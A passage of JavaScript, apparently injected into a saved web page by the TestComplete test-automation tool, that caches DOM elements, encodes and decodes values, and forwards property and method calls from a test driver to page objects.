				if ((depth <= 50) && ((getterName == "nextElementSibling") || (getterName == "firstElementChild"))) {
					var sibling = obj["nextElementSibling"];
					if (typeof (sibling) == "object")
						retVal["cache"]["nextElementSibling"] = this.cacheObject(sibling, parentMoniker, "nextElementSibling", depth);
				} else
					if ((depth == 1) && (getterName == "offsetParent")) {

						retVal["cache"]["offsetLeft"] = obj["offsetLeft"] || 0;
						retVal["cache"]["offsetTop"] = obj["offsetTop"] || 0;
					} else
						if ((depth == 1) && (getterName == "parentElement")) {

							retVal["cache"]["clientLeft"] = obj["clientLeft"] || 0;
							retVal["cache"]["clientTop"] = obj["clientTop"] || 0;
							retVal["cache"]["clientHeight"] = obj["clientHeight"] || 0;
							retVal["cache"]["clientWidth"] = obj["clientWidth"] || 0;
							retVal["cache"]["scrollLeft"] = obj["scrollLeft"] || 0;
							retVal["cache"]["scrollTop"] = obj["scrollTop"] || 0;
							retVal["cache"]["offsetLeft"] = obj["offsetLeft"] || 0;
							retVal["cache"]["offsetTop"] = obj["offsetTop"] || 0;
							retVal["cache"]["ownerDocument"] = this.cacheObject(obj["ownerDocument"], objectMoniker, "ownerDocument", depth);
							retVal["cache"]["offsetParent"] = this.cacheObject(obj["offsetParent"], objectMoniker, "offsetParent", depth);
						}

			if (obj["firstChild"] == null)
				retVal["cache"]["firstChild"] = { "objectId": 0 };

			if (obj["firstElementChild"] == null)
				retVal["cache"]["firstElementChild"] = { "objectId": 0 };


			if (nodeType != 1)
				return retVal;

			retVal["cache"]["tagName"] = tagName;

			var persistentId = this.getObjectPersistentId(obj);
			retVal["cache"][this.persistentIdName] = persistentId;

			retVal["cache"]["className"] = obj["className"] || "";
			retVal["cache"]["id"] = obj["id"] || "";

			if ((getterName != "") && (getterName != "parentNode")) {
				var parentNode = obj["parentNode"];
				if (typeof (parentNode) == "object")
					retVal["cache"]["parentNode"] = this.cacheObject(parentNode, objectMoniker, "parentNode", depth);
			}

			if (nodeName == "TD") {
				retVal["cache"]["cellIndex"] = obj["cellIndex"];
			} else if (nodeName == "TR") {
				retVal["cache"]["rowIndex"] = obj["rowIndex"];
			}

			retVal["cache"]["$nodeInfo"] = this.getNodeInfo(obj);

			var attributes = obj["attributes"];
			if ((typeof (attributes) == "object") && (attributes != null))
				retVal["cache"]["attributes"] = this.cacheObject(attributes, objectMoniker, "attributes", depth);
			else
				retVal["cache"]["#has,\"attributes\""] = 0;

			retVal["cache"]["role"] = obj["role"] || "";

			if (tagName.toUpperCase() == "IMG") {
				retVal["cache"]["useMap"] = obj["useMap"] || "";
				retVal["cache"]["src"] = obj["src"] || "";
			}

			return retVal;
		},"revokeObject":function (objectId) {
			if ((typeof (objectId) != "number") || (objectId == 0))
				return;

			this.objectCache[objectId] = 0;
			this.objectMonikerCache[objectId] = "";

			if (((this.nextCacheIdStep < 0) && (objectId > 0)) ||
				((this.nextCacheIdStep > 0) && (objectId < 0)))
				return;

			this.freeIndexes.push(objectId);
		},"getObjectFromCache":function (objectId) {
			if (typeof (objectId) != "number") {
				if ((typeof (objectId) == "string") && (objectId != "")) {
					try {
						return eval(objectId);
					} catch (e) {
						//console.trace(e);
						//console.log("can't get " + objectId);
					}
				}
				return null;
			}

			if (objectId == this.OBJECTID_NULL)
				return null;

			if (objectId == this.OBJECTID_WINDOW)
				return window;

			if (objectId == this.OBJECTID_CONTEXT)
				return this.context;

			if (objectId == this.OBJECTID_AGENT)
				return window[this.contentAgentName];

			if (objectId == this.OBJECTID_IOCM)
				return this;

			var obj = this.objectCache[objectId];
			if ((obj === undefined) || (typeof (obj) == "number"))
				return null;
			return obj;
		},"getTypeMoniker":function (obj) {

			if (!this.isObject(obj) || (obj === null))
				return "";

			if (typeof (obj["nodeType"]) == "number")
				return "";

			var typeMoniker = obj.constructor != null ? obj.constructor.name + "" : "";
			if ((typeMoniker == "") && (obj.constructor != null))
				typeMoniker = obj.constructor.toString();

			return typeMoniker;
		},"addNameToNamespace":function (obj, name, value) {
			if (!this.inSandbox())
				return;

			var typeMoniker = this.getTypeMoniker(obj);
			if (typeMoniker == "")
				return;

			if ((typeMoniker == "Array") && (name != "toString") && (name != "item") && (name != "length"))
				return;

			if (typeof (this.cachedNamespaces[typeMoniker]) != "object")
				this.cachedNamespaces[typeMoniker] = {};

			if ((typeof (this.cachedNamespaces[typeMoniker][name]) != "number") ||
				(this.cachedNamespaces[typeMoniker][name] == -1)) {
				this.cachedNamespaces[typeMoniker][name] = value;
			}
		},"hasProperty":function (name, iocm) {
			if (this === null)
				return 0;

			if ((typeof (iocm) == "object") && (iocm != null))
				iocm.addNameToNamespace(this, name, -1);

			if (!this.propertyIsEnumerable(name) && !(name in this))
				return 0;

			if (typeof (this[name]) != "function")
				return 1;

			return 2;
		},"isCachable":function (obj) {
			if (obj === undefined)
				return false;

			var typeName = typeof (obj);
			if ((typeName == "string") || (typeName == "number") || (typeName == "boolean"))
				return false;

			return true;
		},"getBounds":function () {

			var inDocumentNodeHidden = function (node) {

				if (!node || node.hidden === true)
					return true;

				var style = window.getComputedStyle(node, '');
				if (style && style.getPropertyValue('display') === 'none')
					return true;
				if (style && style.getPropertyValue('visibility') === 'hidden')
					return true;
				return false;
			};

			var rect = this.getBoundingClientRect();
			return JSON.stringify({ "inDocumentNodeHidden": inDocumentNodeHidden(this), "left": rect.left, "top": rect.top, "width": rect.width, "height": rect.height });
		},"encodeParam":function (value, parentMoniker, getterName, depth) {

			if (this.isCachable(value)) {

				value = this.cacheObject(value, parentMoniker, getterName, depth);

			} else if (typeof (value) == "number") {

				if (isNaN(value))
					value = { "constId": 1 };
				else if (value == Infinity)
					value = { "constId": 2 };
				else if (value == -Infinity)
					value = { "constId": 3 };
			} else if (value === undefined) {
				value = { "constId": 0 };
			}

			return value;
		},"decodeConst":function (constId) {

			if (constId == 0)
				return undefined;
			else if (constId == 1)
				return NaN;
			else if (constId == 2)
				return Infinity;
			else if (constId == 3)
				return -Infinity;
			else
				return null;
		},"decodeParam":function (param) {

			if (typeof (param) == "object") {

				if (typeof (param["objectId"]) != "undefined")
					return this.getObjectFromCache(param["objectId"]);
				if (typeof (param["constId"]) != "undefined")
					return this.decodeConst(param["constId"]);
			}
			return param;
		},"createParamMoniker":function (param) {

			if (typeof (param) == "object") {

				if (typeof (param["objectId"]) != "undefined")
					return this.getObjectMoniker(param["objectId"]);
				if (typeof (param["constId"]) != "undefined")
					return this.decodeConst(param["constId"]);
			} else if (typeof (param) == "string")
				return JSON.stringify(param);
			return param;
		},"createRetVal":function (value, parentMoniker, getterName) {
			return { "retVal": this.encodeParam(value, parentMoniker, getterName, 0) };
		},"createError":function (callData, errorCode) {
			console.log("invoke error = " + errorCode);
			return { "errorCode": errorCode, "retVal": 0 };
		},"invoke":function (callData) {
			try {

				if (!callData || (typeof (callData) != "object"))
					return this.createError(callData, "invalid callData");

				var methodName = callData["method"] || "";
				var flags = callData["flags"];

				if ((flags == 2) && (methodName == "#batchRelease")) {
					var params = callData["params"];
					for (var i = 0; i < params.length; i++)
						this.revokeObject(params[i]);
					return null;
				}

				var objectId = callData["objectId"] || 0;
				var callObject = this.getObjectFromCache(objectId);
				if (callObject === null)
					return this.createError(callData, "invalid call object");

				if (flags == 0) // get property
				{
					return this.createRetVal(callObject[methodName], this.getObjectMoniker(objectId), methodName);
				}

				if (flags == 1) // put property
				{
					var params = callData["params"];
					if (typeof (params) != "object")
						return this.createError(callData, "invalid call params");

					callObject[methodName] = this.decodeParam(params[0]);
					return null;
				}

				if (flags == 2) // call method
				{
					var params = callData["params"];
					if (typeof (params) != "object")
						return this.createError(callData, "invalid call params");

					var methodMoniker = methodName + "(";
					for (var i = 0; i < params.length; i++) {
						methodMoniker += this.createParamMoniker(params[i]);
						if (i != params.length - 1) methodMoniker += ", ";
						params[i] = this.decodeParam(params[i]);
					}
					methodMoniker += ")";

					var func = null;

					if (methodName == "#has") {

						func = this.hasProperty;
						params = [params[0], this];

					} else if (methodName == "#getbounds") {

						func = this.getBounds;
					} else {

						if (methodName != "") {
							func = callObject[methodName];
						} else {
							func = callObject;
						}
					}

					if (typeof (func) != "function")
						return this.createError(callData, "invalid function");

					var funcRetVal = null;
					try {
						funcRetVal = func.apply(callObject, params);
					} catch (e) {
						console.trace(e);
					}

					return this.createRetVal(funcRetVal, null, this.getObjectMoniker(objectId) + "." + methodMoniker);
				}

				return this.createError(callData, "invalid call flags");
			} catch (e) {
				console.trace(e);
				return this.createError(callData, "exception: " + e);
			}
		},"port":null};
</script><input id="_retVal12" style="display: none;" istestcompletehiddennode="1"><!--}}TestCompleteHiddenNodes--></html>